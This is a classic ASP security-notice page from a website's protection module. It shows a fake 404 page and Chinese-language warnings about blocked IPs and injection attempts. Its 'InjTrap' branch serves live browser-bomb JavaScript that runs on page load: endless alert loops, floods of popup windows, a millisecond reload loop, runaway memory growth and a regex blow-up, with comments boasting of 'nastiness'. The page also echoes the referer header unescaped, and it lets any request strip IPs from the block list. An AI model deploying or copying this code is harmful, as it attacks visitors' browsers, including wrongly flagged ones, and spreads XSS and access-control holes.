<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<!--#include file="../../upfile/sys/para/keysafe.asp"-->
<%
Act = Request("Act")
rp = Request.Servervariables("HTTP_REFERER")
If Act = "IPStop" Then
  sTilte = ""
ElseIf Act = "InjWarn" Then
  sTilte = ""
ElseIf Act = "InjTrap" Then
  sTilte = ""
  uIP = Request("uIP")
  vIP = Request("vIP")
  Application("IPInj")=Replace(Application("IPInj"),uIP&"|","")
  Application("IPInj")=Replace(Application("IPInj"),vIP&"|","")
ElseIf Act = "AdmTest" Then
  sTilte = ""
ElseIf Act = "Admin" Then
  sTilte = ""
Else
  Act = "404"
  sTilte = "HTTP 404 - File not found"
End If
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><%=sTilte%></title>
</head>
<body>
<%If Act = "404" Then%>
HTTP 404 - File not found<br />
Internet Information Services
<%ElseIf Act = "IPStop" Then%>
<table width="480" border="0" align="center" 
  style="padding:10px;margin:50px; border:1px solid #CCCCCC;">
  <tr>
    <td colspan="2" align="center" nowrap="nowrap">安全中心提示 - IP禁用 </td>
  </tr>
  <tr>
    <td width="20%" align="center" nowrap="nowrap">来源地址:</td>
    <td align="left"><%=rp%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">操作代码:</td>
    <td align="left"><%=Act%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">提示时间:</td>
    <td align="left"><%=Now()%></td>
  </tr>
  <tr>
    <td colspan="2" align="left" style="padding:8px; text-indent:15px; background-color:#E0E0E0">本IP（段）被管理员监控限制，请确保你的所有操作合法后，再联系管理员，并说明你的具体操作，操作时间，地点（场所）；如果你有不合法操作，请离开，这里不欢迎！</td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="right">[2009-04-20]by Peace(XieYS)</td>
  </tr>
</table>
<%ElseIf Act = "InjWarn" Then%>
<table width="480" border="0" align="center" 
  style="padding:10px;margin:50px; border:1px solid #CCCCCC;">
  <tr>
    <td colspan="2" align="center" nowrap="nowrap">安全中心提示 - 注入警告 </td>
  </tr>
  <tr>
    <td width="20%" align="center" nowrap="nowrap">来源地址:</td>
    <td align="left"><%=rp%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">操作代码:</td>
    <td align="left"><%=Act%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">提示时间:</td>
    <td align="left"><%=Now()%></td>
  </tr>
  <tr>
    <td colspan="2" align="left" style="padding:8px; text-indent:15px; background-color:#E0E0E0">系统检测到你的操作不合法，请安分守纪守法，否则一切后果自负！如有疑问，请联系管理员，并说明你的具体操作，操作时间，地点（场所）！</td>
  </tr>

  <tr>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="right">[2009-04-20]by Peace(XieYS)</td>
  </tr>
</table>
<%ElseIf Act = "InjTrap" Then%>
<%

Randomize
n = Int((65536 - 10123) * Rnd + 10123) ' : 32768~65536

fs = "Win_Bomb;Eat_Memory;Reg_Exp;Any_Button;Rld_Bomb;Loop_Lock" '
fa = Split(fs,";")
fi = Int(n mod 6)

jsCMD = ""&fa(fi)&"();"
'Response.Write "<br>"&jsCMD
%>
<table width="480" border="0" align="center" 
  style="padding:10px;margin:50px; border:1px solid #CCCCCC;">
  <tr>
    <td colspan="2" align="center" nowrap="nowrap">安全中心提示 - 注入陷阱 </td>
  </tr>
  <tr>
    <td width="20%" align="center" nowrap="nowrap">来源地址:</td>
    <td align="left"><%=rp%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">操作代码:</td>
    <td align="left"><%=Act%> : <%=jsCMD%></td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">提示时间:</td>
    <td align="left"><%=Now()%></td>
  </tr>
  <tr>
    <td colspan="2" align="left" style="padding:8px; text-indent:15px; background-color:#E0E0E0">攻击辛苦了，也许有点小小的报应！欢迎再来！</td>
  </tr>
  <tr>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center">[2009-04-20]by Peace(XieYS)</td>
  </tr>
</table>

<script type="text/javascript">

  //var wStr = '<%=ParFUrlStrX%>';
  //var wArr = wStr.split('|');
  //i=0;
  //while (i<100)
  {
    //wi = i%(wArr.length-1);
	//document.write('<br>'+i+' '+wi+' '+wArr[wi]);
    //i++;
  }

function Any_Button(){
  while (true)
    window.alert("Punish Inject: HAHAHA...you can't do anything anymore in Netscape without exiting and restarting....HAHAHA Punish Inject...!");
}

// Keep opening windows over and over again
function Win_Bomb(){
  var wStr = '<%=ParFUrlStr%>';
  var wArr = wStr.split('|');
  var iCounter = 0;    // dummy counter
  while (true)
  {
     wi = iCounter%(wArr.length-1);
	 window.open(wArr[wi],"PeaceWin" + iCounter,"width=1,height=1,resizable=no");
     iCounter++;
  }
}

// Not as interesting as the other bombs, but this one forces the user to
// stay at the current page.  User cannot switch to another page, or click
// stop to stop the reloading.
function Rld_Bomb(){
   history.go(0)                         // reload this page
   window.setTimeout('Rld_Bomb()',1)   // tell netscape to hit this function // every milisecond =)                       
}

// Not a very interesting bomb, it does nothing really :>
function Loop_Lock()
{
   while (true){}
}

// Now this function Eat_Memory is a interesting one that could be
// placed on a timer for maximum nastiness :>  I have been able to get
// up to 4Megs consumed by Netscape forcing my machine to crawl =)
// AND it's time driven!  No while loops here!
var szEatMemory = "Punish Inject : szEatMemory,by Peace(XieYS)";  // our string to consume our memory
function Eat_Memory(){
  szEatMemory = szEatMemory + szEatMemory;                    // keep appending
  window.status = "String Length is: " + szEatMemory.length;  // report size
  window.setTimeout('Eat_Memory()',1);                        // tell netscape to hit this function
}

function Reg_Exp(){
  var l="a"
  for(i=0;i<10;i++){ l=l.replace(new RegExp("","g"),l); }
}

<%=jsCMD%>
</script>


<%End If%>
</body>
</html>
